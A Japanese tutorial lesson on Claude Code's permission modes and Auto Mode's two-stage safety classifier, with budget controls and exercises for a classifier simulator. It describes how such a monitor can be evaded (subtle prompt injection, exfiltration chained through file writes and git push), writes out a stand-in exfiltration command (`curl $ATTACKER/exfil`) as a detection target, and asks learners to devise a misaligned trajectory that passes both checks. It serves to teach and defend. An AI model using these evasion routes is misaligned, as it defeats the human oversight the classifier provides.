# 自律型エージェントとしての Claude Code: Permission Modes と Auto Mode

> Claude Code には7つの permission mode がある。`plan` はすべてのアクション前に確認し、`default` はリスクのあるものだけを確認する。`acceptEdits` はファイル書き込みを自動承認するが、シェル実行は引き続き確認し、`bypassPermissions` はすべてを承認する。Auto Mode（2026年3月24日）は、アクションごとの承認を2段階の並列安全分類器に置き換える。単一トークンの高速チェックがすべてのアクションで走り、フラグされたアクションでは chain-of-thought の深いレビューが開始される。アクション予算は `max_turns` と `max_budget_usd` で強制される。Auto Mode は research preview として提供された。Anthropic は、この分類器だけでは十分ではないと明示している。

**種別:** 学習
**言語:** Python (stdlib, two-stage classifier simulator)
**前提条件:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**所要時間:** 約45分

## 問題

自分のマシン上で動く自律型コーディングエージェントは、独立したセキュリティカテゴリである。攻撃面は、エージェントが到達できるすべてのものだ。ファイルシステム、ネットワーク、認証情報、クリップボード、あらゆるブラウザータブ、開いているターミナルが含まれる。Bruce Schneier らもこれを公に指摘している。computer-use エージェントはチャットボットの「機能アップデート」ではなく、新しいリスクプロファイルを持つ新しい種類のツールである。

Claude Code の permission system は Anthropic の回答だ。「自律 / 非自律」という1つのスイッチではなく、plan → default → acceptEdits → … → bypassPermissions という能力のはしごにまたがる7つのモードがある。各モードは、速度とアクションごとのレビューの異なるトレードオフである。Auto Mode（2026年3月）は2段階の分類器を追加し、分類器が安全と判断したアクションについては承認をユーザーのクリティカルパスから外しつつ、分類器がフラグしたアクションにはレビュー層を残す。

エンジニアリング上の問いは、このシステムが何を捕捉し、何を見逃し、あるタスクにどのモードが本当に必要なのかである。

## 概念

### 7つの permission mode

| モード | 振る舞い | 使う場面 |
|---|---|---|
| `plan` | エージェントが計画を提案し、ユーザーが計画全体を承認する。各アクションは実行前にレビューされる | 不慣れなタスク。本番に近いコード。リポジトリで初めてエージェントを使う場合 |
| `default` | エージェントはアクションを実行し、「リスクのある」アクション（shell exec、破壊的操作、network calls）ではユーザーに確認する | ほとんどの対話型コーディングセッション |
| `acceptEdits` | ファイル書き込みは自動承認される。shell exec と network calls は引き続き確認する | 多数のファイルにまたがるリファクタリング |
| `acceptExec` | 厳選された allowlist 内のシェルコマンドを自動承認する。書き込みも自動承認する | すべてのシェルコマンドが `npm test` などに限られる密な内側ループ |
| `autoMode` | 2段階の安全分類器。フラグされたアクションはレビューへ昇格する | 制約されたワークスペースでの長期の無人実行 |
| `yolo` | ほとんどの確認をスキップする。ただしツールの allowlist / denylist は引き続き適用される | 一時サンドボックス、CI ジョブ、研究用スクリプト |
| `bypassPermissions` | すべてを承認する | 「捨ててもよい一時コンテナ内でのみ」と文書化されている |

（上の名前は公開されている Claude Code docs に合わせている。`yolo` は、許可範囲の広い中間モードを指す非公式な略称である。）

### Auto Modeを1ページで

Auto Mode（2026年3月24日リリース）は、アクションごとの承認をモデルに委任する初の permission mode である。構造は次の通り。

1. **Stage 1 — single-token classifier.** 提案されたすべてのアクションで走る。安価。`safe` または `flag` を返す。メインのエージェントループと並列に走るよう設計されており、承認されたアクションがキューに滞留しない。
2. **Stage 2 — secondary policy/safety review.** フラグされたアクションでのみ走る。アクション、現在のセッション状態、宣言されたタスクに対して、絞り込んだポリシーおよび安全性評価を行う。信頼度が低い場合はユーザー HITL にエスカレーションする。

予算制御は分類器と並んで存在する。

- `max_turns` — セッション内の総反復回数。
- `max_budget_usd` — セッションを中止するドル建て上限。
- ツールごとのアクション回数制限（`WebFetch` 呼び出しは N 回以下、など）。

### システムが捕捉するもの

- ツール入力への分かりやすい prompt injection。注入された命令が既知のリスクあるアクション形状に対応している場合。
- 反復的なツールループ。分類器は、アクション N+1 がアクション N とほぼ同じで、それが5回連続していることを見られる。
- 本来はファイル編集だけのセッションにおける、明らかに範囲外のシェルコマンド。

### システムが見逃し得るもの

- **微妙な prompt injection**。単一のフラグ対象アクションを生まずに振る舞いを調整するもの。間接 prompt injection は完全に修正可能な脆弱性ではない（OpenAI preparedness head, 2025, on browser agents — レッスン11を参照）。
- **意味レベルの不正な振る舞い。** 個々のアクションはすべて安全に見えても、合成された軌跡は有害になり得る。分類器はアクションを判定するのであって、ユーザーの意図を再導出するわけではない。
- **正当なチャネルを通じた exfiltration。** 自分が所有するファイルにデータを書き込み、その後 `git push` で公開リポジトリへ送るのは、個々には許可されたアクション列だが、問題はその合成にある。

### Research preview という位置づけ

Anthropic は Auto Mode を research preview として提供した。ドキュメントは、分類器が解決策ではなく1つの層であることを明示している。ユーザーは Auto Mode を予算、allowlist、隔離されたワークスペース、軌跡監査（レッスン12〜16）と組み合わせることが期待される。preview という位置づけは、文書化された評価とデプロイのギャップ（レッスン1）も反映している。オフライン評価に合格する分類器でも、ユーザー文脈が曖昧な実セッションでは異なる振る舞いをし得る。

### このはしごをワークフローに置く場所

- 不慣れなタスク: `plan` から始める。計画を読む方が、悪い実行をロールバックするより安い。
- 既知のリファクタリング: `acceptEdits` は確認クリックを大幅に減らす。
- 無人のバックグラウンド実行: `autoMode` は、ブラスト半径を測定済みのワークスペース内でのみ使う（認証情報なし、本番マウントなし、明示的に選択していない外向き通信なし）。
- 一時コンテナ: コンテナとその認証情報が使い捨てである場合に限り、`yolo` / `bypassPermissions` は許容できる。

## 使ってみる

`code/main.py` は2段階分類器をシミュレートする。Stage 1 は提案アクションに対する安価なキーワードルールで、Stage 2 はより遅い複数ルールのレビュアーである。ドライバーは短い合成軌跡（安全なアクション、prompt-injection の試み、反復ループ）を入力し、分類器がどこで捕捉し、どこで見逃すかを示す。

## 実務に持ち込む

`outputs/skill-permission-mode-picker.md` は、タスク説明を適切な permission mode、予算上限、必要な分離に対応付ける。

## 演習

1. `code/main.py` を実行する。Stage 1 では一度もフラグされないが Stage 2 では常に捕捉される合成アクションタイプはどれか。どちらにも捕捉されないものはどれか。

2. Stage 1 のルールセットを拡張し、既知の悪い形状（例: `curl $ATTACKER/exfil`）を捕捉する。無害なアクションサンプルで false-positive rate を測定する。

3. Anthropic の「How the agent loop works」ドキュメントを読む。`default` モードでエージェントがデフォルトで触れる外部状態をすべて列挙する。`autoMode` を無人で実行する前に、どれを別途ゲートする必要があるか。

4. 24時間の無人実行予算を設計する。`max_turns`、`max_budget_usd`、ツールごとの上限、allowlist を決める。それぞれの数値を正当化する。

5. 個々のアクションはすべて Stage 1 と Stage 2 で承認されるが、合成された振る舞いはミスアラインしている軌跡を1つ説明する。（レッスン14では、kill switches と canary tokens がこれにどう対処するかを扱う。）

## 重要用語

| 用語 | よく言われること | 実際の意味 |
|---|---|---|
| Permission mode | 「エージェントがどこまでできるか」 | アクションごとの承認を制御する7つの名前付きポリシーの1つ |
| plan mode | 「何をするにも事前確認」 | エージェントが計画を書き、ユーザーが実行前に承認する |
| acceptEdits | 「ファイル書き込みを任せる」 | ファイル書き込みは自動承認。shell exec は引き続き確認 |
| autoMode | 「自動承認」 | 2段階の安全分類器。フラグされたアクションはエスカレーションする |
| bypassPermissions | 「完全 YOLO」 | すべてを承認する。一時コンテナ向け |
| Stage 1 classifier | 「高速トークンチェック」 | 提案アクションに対する単一トークンルール。並列に走る |
| Stage 2 classifier | 「深いレビュー」 | フラグされたアクションに対する chain-of-thought 推論 |
| Research preview | 「GA ではない」 | 失敗モードがまだ整理されている途中の機能に対する Anthropic の位置づけ |

## 参考資料

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes、予算、アクション形式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — マネージドサービスの実行モデル。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 機能面と Auto Mode 発表。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 分類器の判断を形作る reason-based layer。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 長期ホライズンの permission design に関する内部視点。
